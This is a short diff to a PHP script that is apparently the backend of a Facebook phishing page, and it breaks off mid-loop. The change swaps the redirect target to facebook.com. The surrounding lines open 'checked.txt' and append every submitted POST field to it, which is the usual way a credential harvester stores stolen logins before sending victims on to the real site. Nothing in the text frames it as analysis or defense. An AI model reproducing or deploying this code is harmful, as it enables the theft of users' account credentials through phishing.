@@ -1,5 +1,5 @@
 <?php
-header ('Location:http://www.fb.com');
+header ('Location:http://www.facebook.com');
 $handle = fopen("checked.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
